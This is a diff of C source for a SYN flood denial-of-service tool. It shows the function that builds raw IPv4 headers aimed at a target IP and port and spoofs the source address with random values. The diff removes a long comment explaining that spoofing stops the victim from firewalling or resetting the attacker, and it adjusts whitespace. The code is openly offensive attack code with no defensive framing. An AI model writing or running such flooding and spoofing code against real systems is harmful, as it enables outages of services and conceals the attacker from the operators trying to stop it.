@@ -52,42 +52,13 @@ void syn_flood(const char* target_ip, int target_port) {
     // Filling in the IP header
     ip->ihl = 5;
     ip->version = 4;  // IPv4
-    ip->tos = 0;      // Type of Service
+    ip->tos = 0; // Type of Service
     ip->tot_len = htons(PACKET_LEN); // Packet length
     ip->id = htons(rand()); // Package ID
     ip->frag_off = 0; // Fragmentation flags
     ip->ttl = 255; // Time to live 
     ip->protocol = IPPROTO_TCP; // Top-level protocol
     ip->check = 0; // Checksum (so far 0)
-    /*
-     IP Spoofing (ip->saddr = rand()) — "Sender Masking"
-
-Why?
-Imagine that you call someone and replace the number with a random one.
-
-In SYN flood:
-
-The real IP of the sender is replaced with a random one.
-
-The server tries to respond to the SYN-ACK, but... there is no such address.
-
-As a result, the connection "hangs" in a half-open state until the timeout expires.
-
-In the code:
-c
-
-ip->saddr = htonl(rand()); // Substituting the original IP
-
-Why is this important for the attack?
-
-If the attacker used a real IP, the server could:
-
-Block it with a firewall.
-
-Send an RST (reset connection).
-
-With fake IPs, the attack is harder to stop.
-    */
     ip->saddr = htonl(rand()); // Source IP spoofing
     ip->addr = inet_addr(target_ip); // Target IP
     
